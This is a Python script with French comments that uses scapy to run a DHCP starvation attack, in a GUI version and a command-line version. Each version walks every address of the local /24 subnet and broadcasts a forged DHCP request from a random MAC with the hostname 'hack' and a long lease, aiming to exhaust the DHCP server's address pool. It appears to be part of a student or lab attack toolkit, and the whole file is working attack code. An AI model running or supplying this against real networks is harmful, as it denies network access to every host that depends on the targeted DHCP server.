#!/usr/bin/python3
'''Code source pour l'attaque DHCP Starvation'''
#Importation de toutes les fonctionnalités de la bibliothèque scapy
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from tqdm import tqdm
import sys

import utils

# Fonction de l'attaque DHCP pour l'interface GUI
def dhcp(interface,win,pg):
    '''Cette fonction nous permet de lancer une attaque de type DHCP Starvation
    interface -->str
    win-->Tk
    pg--> progressbar'''
    # Construction d'un paquet DHCP_DISCOVER à envoyer
    # Construction de la couche L1 Ethernet avec une adresse MAC de destination de multidiffusion et une adresse MAC source aléatoire avec la fonction "RandMAC" afin d'empêcher le serveur DHCP de déterminer l'expéditeur
    frame_discover_l1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC(), type=0x0800)
    # Construction de la couche L2 IP avec une adresse source par défaut et une adresse destination 255.255.255.255
    frame_discover_l2 = IP(src="0.0.0.0", dst="255.255.255.255")
    # Construction de la couche L3 UDP en spécifiant à quel port nous voulons que ce paquet soit envoyé, le port de destination est 67 et celui source est 68
    frame_discover_l3 = UDP(dport=67, sport=68)
    # Ajout de l'en-tête "BOOTP" afin de spécifier des options, "op=1" indique qu'il s'agit d'une demande de démarrage, de plus, l'adresse MAC du client se voit attribuer une adresse aléatoire
    frame_discover_l4 = BOOTP(op=1, chaddr=RandMAC())

    # Récuperation de l'IP de la carte réseau utilisé
    ip = get_if_addr(interface)
    # Séparation de tout les octets de l'IP et stockage dans une liste
    liste = ip.split(".")
    # Suppression du dernier octet de l'IP
    liste.pop(3)
    ip_str = ""
    # Pour chaque tour de boucle nous supprimons les points afin d'obtenir une IP sans "."
    for i in range(len(liste)):
        if (i != 0):
            ip_str = (ip_str + "." + liste[i])
        else:
            ip_str = (ip_str + liste[i])
    # À chaque tour de boucle nous ajoutons "1" au dernier octet de l'IP puis nous reconstruisons l'IP avec les "." à partir de la liste
    for j in range(0, 256):
        if(liste[0]=="0"):
            print("L'adresse utilisée n'est pas disponible")
            return
        elif(liste[0]=="127"):
            print("L'adresse utilisée n'est pas disponible")
            return
        liste = ip.split(".")#Séparation de l'ip en une liste
        liste.pop(3)#Suppresion du dernier octets
        str_vide = ""#Creation d'une chaine de caratère vide
        new = ip_str + str_vide + "." + str(j)#Concaténation de l'ip avec le dernier octets qui change a chaque tour de boucle
        print("Attaque en cours sur l'IP " + new)
        pg.step(0.39) # Ajout de 0.39 à  la barre de progression
        win.update() # Mise a jour de la fenetre
        # Création de la couche 4 du paquets avec comme adresse de destination l'IP générée dans la boucle
        frame_release_l4 = BOOTP(ciaddr=new, xid=RandInt())
        # Création du message DHCP avec un type de message "request", ainsi qu'un "lease time" correspondant au temps où l'IP ne peut pas être redistribuée, ici, à 100 000 secondes
        frame_discover_l5 = DHCP(
            options=[("message-type", "request"), ("requested_addr", new), ("hostname", "hack"), ("lease_time", 100000),
                     "end"])
        # Encapsulation des différentes couches afin d'obtenir un paquet
        frame_discover = frame_discover_l1 / frame_discover_l2 / frame_discover_l3 / frame_discover_l4 / frame_discover_l5
        # Envoie du segment grâce à la fonction "sendp", le DHCP fonctionnant sur la couche L2 du modèle OSI
        # Envoie du paquet à l'intérieur d'une boucle "loop=1" afin d'effectuer plusieurs interrogations demandant les adresses IP
        sendp(frame_discover, iface=interface, loop=0, verbose=0)
        time.sleep(0.4)

# Fonction de l'attaque DHCP pour l'interface CLI
def dhcp_no_gui(interface):
    # Construction d'un paquet DHCP_DISCOVER à envoyer
    # Construction de la couche L1 Ethernet avec une adresse MAC de destination de multidiffusion et une adresse MAC source aléatoire avec la fonction "RandMAC" afin d'empêcher le serveur DHCP de déterminer l'expéditeur
    frame_discover_l1 = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC(), type=0x0800)
    # Construction de la couche L2 IP avec une adresse source par défaut et une adresse destination 255.255.255.255
    frame_discover_l2 = IP(src="0.0.0.0", dst="255.255.255.255")
    # Construction de la couche L3 UDP en spécifiant à quel port nous voulons que ce paquet soit envoyé, le port de destination est 67 et celui source est 68
    frame_discover_l3 = UDP(dport=67, sport=68)
    # Ajout de l'en-tête "BOOTP" afin de spécifier des options, "op=1" indique qu'il s'agit d'une demande de démarrage, de plus, l'adresse MAC du client se voit attribuer une adresse aléatoire
    frame_discover_l4 = BOOTP(op=1, chaddr=RandMAC())

    # Récuperation de l'IP de la carte réseau utilisé
    ip = get_if_addr(interface)
    # Séparation de tout les octets de l'IP et stockage dans une liste
    liste = ip.split(".")
    # Suppression du dernier octet de l'IP
    liste.pop(3)
    ip_str = ""
    # Pour chaque tour de boucle nous supprimons les points afin d'obtenir une IP sans "."
    for i in range(len(liste)):
        if (i != 0):
            ip_str = (ip_str + "." + liste[i])
        else:
            ip_str = (ip_str + liste[i])
    # À chaque tour de boucle nous ajoutons "1" au dernier octet de l'IP puis nous reconstruisons l'IP avec les "." à partir de la liste
    taille = 40
    for j in range(0, 256):
        if (liste[0] == "0"):
            print("L'adresse utilisée n'est pas disponible")
            return
        elif (liste[0] == "127"):
            print("L'adresse utilisée n'est pas disponible")
            return
        #Code de la barre réalisé par une intéligence artificielle
        pourcentage = j / 256 # Porucentage actuelle de l'attaque
        barre = int(taille * pourcentage) # Calcul de la partie non utilisé de la barre
        jauge = f"[{'#' * barre}{'-' * (taille - barre)}] {int(pourcentage * 100)}%" #Creation de la barre avec l'utilisation d'un f string et modificaiton en fonction du pourcentage
        sys.stdout.write('\r' + jauge+"\n") # Ecriture de la barre
        liste = ip.split(".")  # Séparation de l'ip en une liste
        liste.pop(3)  # Suppresion du dernier octets
        str_vide = ""  # Creation d'une chaine de caratère vide
        new = ip_str + str_vide + "." + str(j)  # Concaténation de l'ip avec le dernier octets qui change a chaque tour de boucle
        print("Attaque en cours sur l'IP " + new)
        # Création de la couche 4 du paquets avec comme adresse de destination l'IP générée dans la boucle
        frame_release_l4 = BOOTP(ciaddr=new, xid=RandInt())
        # Création du message DHCP avec un type de message "request", ainsi qu'un "lease time" correspondant au temps où l'IP ne peut pas être redistribuée, ici, à 100 000 secondes
        frame_discover_l5 = DHCP(
            options=[("message-type", "request"), ("requested_addr", new), ("hostname", "hack"), ("lease_time", 100000),
                     "end"])
        # Encapsulation des différentes couches afin d'obtenir un paquet
        frame_discover = frame_discover_l1 / frame_discover_l2 / frame_discover_l3 / frame_discover_l4 / frame_discover_l5
        # Envoie du segment grâce à la fonction "sendp", le DHCP fonctionnant sur la couche L2 du modèle OSI
        # Envoie du paquet à l'intérieur d'une boucle "loop=1" afin d'effectuer plusieurs interrogations demandant les adresses IP
        sendp(frame_discover, iface=interface, loop=0, verbose=0)

        time.sleep(0.4)